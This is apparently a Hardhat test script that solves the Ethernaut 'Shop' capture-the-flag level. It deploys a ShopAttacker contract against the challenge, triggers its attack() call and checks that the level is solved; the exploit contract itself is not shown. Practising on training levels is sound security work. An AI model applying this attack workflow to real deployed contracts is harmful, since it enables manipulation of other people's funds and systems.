import { expect } from "chai";
import { Contract, Signer, BigNumber } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel, bigNumberToEther,
         logEvents, dumpStorage } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Shop`);
  const challengeAddress = await createChallenge(
    `0x3aCd4766f1769940cA010a907b3C8dEbCe0bd4aB`
  );

  challenge = await challengeFactory.attach(challengeAddress);

  const attackerFactory = await ethers.getContractFactory(`ShopAttacker`);
  attacker = await attackerFactory.deploy(challenge.address);
});

it("solves the challenge", async function () {
    tx = await attacker.attack({ gasLimit: 60000});
    const receipt = tx.wait();
    console.log(await challenge.price());
});

after(async () => {
  expect(await submitLevel(challenge.address), "level should be solved").to.be.true;
});
